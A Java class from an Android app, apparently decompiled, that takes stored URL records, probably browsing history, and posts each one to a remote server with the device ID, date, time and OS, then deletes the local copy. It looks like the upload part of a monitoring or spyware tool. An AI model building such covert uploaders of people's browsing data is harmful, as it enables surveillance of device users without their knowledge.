package iits.mamager;

import android.content.Context;
import iits.code.bus.URL_BUS;
import iits.code.dao.URL_DAO;
import iits.code.dto.URL_DTO;
import iits.common.Constants;
import iits.common.Format;
import iits.common.HTTPWeb;
import java.util.ArrayList;

public class URLManager {
    private static final String TAG = "URLManager";

    private static ArrayList<String> getArrayParameterKeyURL() {
        ArrayList<String> arrKey = new ArrayList<>();
        arrKey.add("deviceid");
        arrKey.add("date");
        arrKey.add("time");
        arrKey.add(URL_DAO.KEY_URL);
        arrKey.add("os");
        return arrKey;
    }

    private static ArrayList<String> getArrayParameterValueURL(String deviceID, URL_DTO url) {
        ArrayList<String> arrValue = new ArrayList<>();
        if (deviceID.equals("") || url == null) {
            return null;
        }
        arrValue.add(String.valueOf(deviceID));
        arrValue.add(Format.formatDate(url.getTime()));
        arrValue.add(Format.formatTime(url.getTime()));
        arrValue.add(String.valueOf(url.getURL()));
        arrValue.add(Constants.OS);
        return arrValue;
    }

    public static void sendDataOfURLToWebsite(Context context, String url, String deviceID) {
        try {
            ArrayList<URL_DTO> arrURL = URL_BUS.getAlls(context);
            ArrayList<String> arrKey = getArrayParameterKeyURL();
            int n = arrURL.size() - 1;
            FileManager.WriteLog(1, TAG, "n= " + String.valueOf(n + 1));
            for (int i = n; i >= 0; i--) {
                if (HTTPWeb.sendPostMethod(url, arrKey, getArrayParameterValueURL(deviceID, arrURL.get(i))) != null) {
                    FileManager.WriteLog(1, TAG, "send url: " + arrURL.get(i).getURL());
                    URL_BUS.delete(context, arrURL.get(i).getID());
                    arrURL.remove(i);
                }
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on sendDataOfURLToWebsite function: " + e.toString());
        }
    }
}
